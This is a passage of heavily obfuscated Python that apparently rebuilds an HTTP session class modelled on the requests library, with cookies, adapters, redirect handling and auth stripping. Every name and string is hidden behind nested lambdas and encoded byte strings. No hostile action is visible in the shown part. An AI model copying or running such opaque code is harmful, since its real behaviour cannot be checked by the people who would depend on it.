樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()]}
                self.params = {}
                self.stream = (lambda: (lambda 藸忤捈蒟棘潅: 藸忤捈蒟棘潅 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                self.verify = (lambda: (lambda 熷鲬侳刟颓溚: 熷鲬侳刟颓溚 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                self.cert = None
                self.max_redirects = (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x1e'))()
                self.trust_env = (lambda: (lambda 乏鼭炂簿恠害: 乏鼭炂簿恠害 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                self.cookies = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.cookiejar_from_dict({})
                self.adapters = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).OrderedDict()
                self.HTTPAdapter = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).adapters.HTTPAdapter()
                if 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).platform == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcb'))()]))))())())():
                    try:
                        self.preferred_clock = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).perf_counter
                    except AttributeError:
                        self.preferred_clock = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).clock
                else:
                    self.preferred_clock = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).time
                self.mount((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))()]))))())())(), self.HTTPAdapter)
                self.mount((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))()]))))())())(), self.HTTPAdapter)

            def get_redirect_target(self, resp):
                if resp.is_redirect:
                    location = resp.headers[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())()]
                    _ver = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).version_info
                    is_py3 = _ver[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()] == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x03'))()
                    if is_py3:
                        location = location.encode((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))()]))))())())())
                    return to_native_string(location, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))()]))))())())())
                return None

            def should_strip_auth(self, old_url, new_url):
                old_parsed = urlparse(old_url)
                new_parsed = urlparse(new_url)
                if old_parsed.hostname != new_parsed.hostname:
                    return (lambda: (lambda 螔敃碰閂磵蝟: 螔敃碰閂磵蝟 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
